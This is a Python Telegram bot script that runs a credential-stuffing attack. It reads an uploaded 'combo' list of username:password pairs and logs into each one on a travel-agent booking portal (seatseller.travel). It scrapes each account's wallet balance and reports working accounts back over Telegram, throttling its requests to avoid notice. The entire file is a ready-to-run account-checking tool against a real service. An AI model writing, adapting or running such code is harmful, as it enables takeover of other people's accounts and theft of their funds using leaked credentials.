# bot.py
import os
import time
import requests
from bs4 import BeautifulSoup
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# ----------------- CONFIG -----------------
# Prefer environment variables. On Render/hosting set these in service settings.
TOKEN = os.environ.get("TELEGRAM_TOKEN", "")   # set in host's env vars
MY_CHAT_ID = int(os.environ.get("MY_CHAT_ID", "0"))  # set your numeric id here
# ------------------------------------------

LOGIN_URL = "https://in3.seatseller.travel/ssui/NewLoginPage-iFrm"
BALANCE_CSS = "span.right_cnt_agnt"
DELAY_BETWEEN = 2.0  # safe mode delay (seconds)

bot = Bot(TOKEN)

def start(update: Update, ctx: CallbackContext):
    if update.effective_user.id != MY_CHAT_ID:
        update.message.reply_text("You are not allowed to use this bot.")
        return
    update.message.reply_text("Send your combo .txt file (one per line: username:password).")

def handle_file(update: Update, ctx: CallbackContext):
    if update.effective_user.id != MY_CHAT_ID:
        return
    msg = update.message.reply_text("File received — processing. Please wait...")
    doc = update.message.document
    f = doc.get_file()
    data = f.download_as_bytearray().decode(errors="ignore")
    lines = [l.strip() for l in data.splitlines() if l.strip() and ":" in l]

    session = requests.Session()
    results = []
    for i, line in enumerate(lines, start=1):
        user, pwd = line.split(":", 1)
        user = user.strip(); pwd = pwd.strip()
        try:
            # 1) fetch login page (get cookies)
            session.get(LOGIN_URL, timeout=15)

            # 2) Post login — NOTE: if site expects different field names, edit USERNAME_FIELD/PASSWORD_FIELD
            payload = {
                "username": user,   # <-- may need change to actual field name (see notes below)
                "password": pwd
            }
            r = session.post(LOGIN_URL, data=payload, timeout=20)

            # 3) Try to find balance in returned HTML
            soup = BeautifulSoup(r.text, "html.parser")
            el = soup.select_one(BALANCE_CSS)
            if not el:
                # try GET dashboard (some sites redirect)
                dash = session.get(LOGIN_URL, timeout=12)
                soup2 = BeautifulSoup(dash.text, "html.parser")
                el = soup2.select_one(BALANCE_CSS)

            if el:
                bal = el.get_text(strip=True)
                results.append(f"{user} → {bal}")
            else:
                results.append(f"{user} → LOGIN FAILED / balance not found")
        except Exception as e:
            results.append(f"{user} → ERROR: {e}")

        # progress update every 10 items
        if i % 10 == 0:
            try:
                update.message.reply_text("\n".join(results[-10:]))
            except:
                pass

        time.sleep(DELAY_BETWEEN)

    # send final results (break into chunks if too long)
    final = "Results:\n" + "\n".join(results)
    for chunk_start in range(0, len(final), 3900):
        update.message.reply_text(final[chunk_start:chunk_start+3900])

def main():
    if not TOKEN or MY_CHAT_ID == 0:
        print("ERROR: TELEGRAM_TOKEN or MY_CHAT_ID not set. Set as env vars.")
        return
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), handle_file))
    print("Bot started — polling...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
